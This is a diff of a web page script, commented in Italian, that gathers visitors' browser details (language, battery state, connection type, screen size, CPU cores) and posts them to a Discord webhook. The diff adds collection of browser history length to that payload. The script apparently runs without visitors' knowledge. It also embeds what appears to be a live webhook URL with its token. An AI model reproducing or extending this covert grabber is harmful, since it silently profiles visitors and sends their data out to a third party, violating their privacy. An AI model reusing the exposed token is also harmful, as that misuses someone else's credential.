@@ -40,7 +40,7 @@
             // Lingua preferita
             const language = navigator.language;
 
-            // Stato della batteria
+            // Stato della batteria e percentuale
             let batteryLevel = "Non disponibile";
             let chargingStatus = "Non disponibile";
             if (navigator.getBattery) {
@@ -70,6 +70,9 @@
             const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
             const connectionType = connection ? connection.effectiveType : "Non disponibile";
 
+            // Cronologia del sito
+            const historyLength = window.history.length;
+
             // Invio al webhook di Discord
             const webhookUrl = "https://discord.com/api/webhooks/1272560385056309308/HDi64rOGFyq5ZxVyV0NUaLr75YEqwl3SkeXBzeRvfGE_4apZZH2_jBZSwpdBXIQ_LuFq";
             const payload = {
@@ -86,6 +89,7 @@
                         { name: "Risoluzione Schermo", value: `${screenWidth}x${screenHeight}`, inline: true },
                         { name: "Core del Processore", value: hardwareConcurrency.toString(), inline: true },
                         { name: "Tipo di Connessione", value: connectionType, inline: true },
+                        { name: "Cronologia Sito", value: historyLength.toString(), inline: true },
                     ]
                 }]
             };
